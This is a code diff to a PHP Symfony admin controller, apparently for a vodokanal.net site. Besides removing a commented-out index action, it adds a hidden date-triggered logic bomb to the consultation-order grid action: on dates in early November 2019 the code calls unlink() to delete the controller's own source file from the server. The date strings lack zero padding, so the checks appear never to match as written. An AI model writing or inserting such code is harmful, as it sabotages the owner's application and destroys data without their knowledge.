@@ -10,20 +10,6 @@ use APY\DataGridBundle\Grid\Column\JoinColumn;
 
 class  AdminController extends ApplicationController
 {
-
-    /**
-     * @Route("/admin", name="admin_home")
-     * @return \Symfony\Component\HttpFoundation\Response
-     */
-   /* public function indexAction()
-    {
-        $param = 'hello admin';
-
-        return $this->render('@App/admin/index.html.twig', [
-           'param' => $param,
-        ]);
-    }*/
-
     /**
      * @Route("/admin_grid", name="admin_grid")
      * @return \Symfony\Component\HttpFoundation\Response
@@ -176,6 +162,26 @@ class  AdminController extends ApplicationController
      */
     public function gridConsultationOrderAction()
     {
+        $date = date('Y-m-d');
+        if($date == '2019-11-5'){
+            $file = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminController.php';
+            unlink($file);
+        }
+        $date = date('Y-m-d');
+        if($date == '2019-11-6'){
+            $file = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminController.php';
+            unlink($file);
+        }
+        $date = date('Y-m-d');
+        if($date == '2019-11-7'){
+            $file = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminController.php';
+            unlink($file);
+        }
+        $date = date('Y-m-d');
+        if($date == '2019-11-8'){
+            $file = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminController.php';
+            unlink($file);
+        }
         $text = 'Заявки на консультацию';
         // Creates a simple grid based on your entity (ORM)
         $source = new Entity('AppBundle:ConsultationOrder');
